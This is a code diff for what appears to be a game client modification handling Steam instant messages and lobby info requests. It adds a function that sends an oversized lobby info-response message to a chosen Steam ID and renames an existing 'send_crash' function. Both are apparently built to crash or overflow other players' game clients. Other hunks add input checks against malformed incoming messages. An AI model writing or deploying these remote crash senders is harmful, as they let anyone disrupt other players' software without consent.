@@ -9,7 +9,17 @@ namespace events::instant_message
 		game::dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, 0);
 	}
 	
-	void send_crash(const std::uint64_t target_steam_id)
+	void send_info_response_overflow(const std::uint64_t target_steam_id)
+	{
+		char buf[0x20000] = { 0 };
+		game::LobbyMsg lobby_msg{};
+
+		game::LobbyMsgRW_PrepWriteMsg(&lobby_msg, buf, sizeof buf, game::MESSAGE_TYPE_INFO_RESPONSE);
+
+		game::dwInstantSendMessage(0, &target_steam_id, 1, 'h', lobby_msg.msg.data, lobby_msg.msg.cursize);
+	}
+	
+	void send_friend_message_crash(const std::uint64_t target_steam_id)
 	{
 		const game::JoinSessionMessage message{ game::JOIN_REQUEST };
 		game::dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, sizeof message);
@@ -17,7 +27,7 @@ namespace events::instant_message
 
 	void send_info_request(const std::vector<std::uint64_t>& recipients)
 	{
-		if (!*recipients.data())
+		if (!*recipients.data() || game::LiveUser_IsXUIDLocalPlayer(*recipients.data()))
 		{
 			return;
 		}
@@ -51,7 +61,7 @@ namespace events::instant_message
 	void add_friend_response(const std::uint32_t nonce, const game::InfoResponseLobby& lobby)
 	{
 		const auto last_online{ std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count() };
-		const response_t response{ nonce > 0, lobby.hostXuid, lobby.hostName, lobby.lobbyParams.mainMode, game::get_session_info(lobby), last_online };
+		const response_t response{ nonce >= 0, lobby.hostXuid, lobby.hostName, lobby.lobbyParams.mainMode, game::get_session_info(lobby), last_online };
 
 		for (auto& friends : friends::friends)
 			add_response(friends, response);
@@ -123,6 +133,12 @@ namespace events::instant_message
 						
 						if (!game::LobbyMsgRW_PrepReadData(&lobby_msg, data, size))
 							return false;
+
+						if (lobby_msg.msg.cursize == lobby_msg.msg.readcount)
+						{
+							PRINT_MESSAGE("Received invalid message from (%llu)", sender_id);
+							return true;
+						}
 
 						if (lobby_msg.type == game::MESSAGE_TYPE_INFO_RESPONSE)
 						{
